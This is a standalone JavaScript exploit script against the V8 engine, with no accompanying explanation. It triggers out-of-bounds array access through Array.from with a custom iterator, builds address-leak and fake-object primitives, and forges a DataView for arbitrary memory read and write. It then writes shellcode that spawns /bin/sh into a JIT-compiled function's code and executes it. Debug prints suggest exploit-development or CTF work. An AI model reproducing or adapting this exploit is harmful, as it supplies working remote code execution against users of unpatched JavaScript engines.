function jitCall() {
	return 1;
};

fun = jitCall
fun();
for(var i=0;i<0x800;i++)
	fun(5);

//var q = [123,456];
//q[0] = fun;
//%DebugPrint(fun);
function floatToInt(floatArray) {
	var intArray = new Uint32Array(new Float64Array([floatArray]).buffer)
	return [intArray[0],intArray[1]]
}

function floatToInt2(floatArray2) {
        var intArray = new Uint32Array(new Float64Array([floatArray2]).buffer)
        return [intArray[0],intArray[1]]
}


function intToFloat(lo,hi) {
	var fArray = new Float64Array(1);
	var temp = new Uint32Array(fArray.buffer);
	temp[0] = lo;
	temp[1] = hi;
	return fArray[0];
}

function oobArray(arg0) {
	Array.from.call(function() {return arg0}, {[Symbol.iterator] : _ => (
		{
		    counter : 0,
		    max : 1024 * 1024 * 4,
		    next() {
		    	let result = this.counter++;
      			if (this.counter == this.max) {
				arg0.length = 0;
				return {done: true};
      			} else {
        			return {value: 0x44, done: false};
      			}
    		},
  	}
)});
	return arg0;
};
function sleep (delay) {
   var start = new Date().getTime();
   while (new Date().getTime() < start + delay);
}

var ab= new ArrayBuffer(8);
var dv = new DataView(ab);
dv.setUint32(0,0x42424242);
var floatArray = [1.1];
var intArray = [1];
floatArray = oobArray(floatArray);
intArray = oobArray(intArray);
var mapArray =  [
  intToFloat(0.0),intToFloat(0, 0x0d000439),intToFloat(0, 0),
	intToFloat(0,0),intToFloat(0,0),intToFloat(0,0),intToFloat(0,0),
	intToFloat(0,0),intToFloat(0,0),intToFloat(0,0),intToFloat(0,0),
	intToFloat(0,0),intToFloat(0,0),intToFloat(0,0),intToFloat(0,0),
	intToFloat(0,0)];
//[1] = type
intArray[0] = fun;
intArray[1] = mapArray;
intArray[6] = ab;
intArray[7] = dv;
intArray[8] = 0x41414141;
var funl = floatToInt(floatArray[0])
var mapl = floatToInt(floatArray[1])
mapl[0] = mapl[0]-0x1 + 0x420;
funl[0] = funl[0]-0x1;
console.log('0x'+funl[1].toString(16)+funl[0].toString(16));
console.log('0x'+mapl[1].toString(16)+(mapl[0]).toString(16));
%DebugPrint(intArray);
//ab start -> mapArray[4]
mapArray[9] = intToFloat(funl[0]+0x30,funl[1]);
mapArray[10] = intToFloat(funl[0]+0x30,funl[1]);
var dvArray  = [
	intToFloat(mapl[0]+0x1,mapl[1]),intToFloat(0,0),intToFloat(0,0),
	intToFloat(mapl[0]+0x1+40,mapl[1]),intToFloat(0,0),intToFloat(0,0x9000),];
intArray[2] = dvArray;
var dvl = floatToInt(floatArray[2]);
dvl[0] = dvl[0]-1 + 0x218+0x20-0x20+0x20-0x20+0x20-0x20+0x20-0x20+0x20
console.log('0x'+dvl[1].toString(16)+(dvl[0]).toString(16));
//AAAABBBB
floatArray[2] = intToFloat(dvl[0]+1,dvl[1]);
var jit = intArray[2];
var jitl = [0,0];
jitl[0] = DataView.prototype.getUint32.call(jit,0,true)+0x5f;
jitl[1] = DataView.prototype.getUint32.call(jit,4,true);
console.log('Jit: 0x'+jitl[1].toString(16)+jitl[0].toString(16));
var shellcode = [0xbb48c031, 0x91969dd1, 0xff978cd0, 0x53dbf748, 0x52995f54, 0xb05e5457, 0x50f3b]
mapArray[9]=intToFloat(jitl[0],jitl[1]);
console.log('Call SET');
for (var i=0;i<shellcode.length;i++) {
    DataView.prototype.setUint32.call(jit,i*4,shellcode[i], true);
}
console.log('Call SET END');
console.log(fun(0x1234));
intArray[intArray.length-1]=0x41414141;
